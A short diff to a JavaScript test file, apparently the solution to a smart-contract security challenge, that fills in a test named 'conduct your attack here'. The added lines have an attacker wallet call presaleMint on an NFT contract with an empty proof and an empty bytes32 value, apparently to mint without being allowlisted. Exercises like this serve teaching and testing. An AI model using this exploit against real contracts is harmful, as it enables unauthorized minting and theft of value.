@@ -25,6 +25,9 @@ describe(NAME, function () {
 
         it("conduct your attack here", async function () {
             // do it
+            await nftContract
+                .connect(attackerWallet)
+                .presaleMint([], ethers.utils.formatBytes32String(""));
         });
 
         after(async function () {
